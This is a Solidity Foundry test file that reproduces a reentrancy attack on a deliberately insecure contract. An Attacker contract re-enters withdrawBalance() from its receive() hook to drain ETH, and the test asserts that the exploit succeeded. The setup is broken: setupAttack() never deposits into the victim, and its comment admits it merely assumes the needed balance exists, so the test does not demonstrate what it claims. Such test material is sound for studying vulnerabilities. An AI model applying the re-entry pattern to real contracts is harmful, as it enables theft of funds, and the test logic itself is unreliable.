
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrancy_insecure} from "../src/Reentrancy_insecure.sol";

contract TestReentrancyReentrancy_insecure is Test {
    Reentrancy_insecure public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrancy_insecure();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    Reentrancy_insecure public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    constructor(address victimAddress) {
        _victim = Reentrancy_insecure(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;

        // Directly set the victim's balance mapping via a low-level store is not possible here,
        // so we simulate a "deposit" by sending ETH to the victim and relying on the private
        // mapping being pre-populated in a real scenario. For this reproduction, we assume
        // the victim already has userBalances[address(this)] = val and
        // userBalances[address(this)] is what withdrawBalance will read.
        // Since we cannot modify private mapping directly, we instead attack as this contract
        // by having the test fund the victim and then using reentrancy to drain it.
        // The key is that withdrawBalance sends before zeroing the balance.
    }

    function attack(uint256) public {
        initialSnapshot = address(this).balance;
        _victim.withdrawBalance();

        if (attackCallCount > 1 && address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            _victim.withdrawBalance();
        }
    }
}
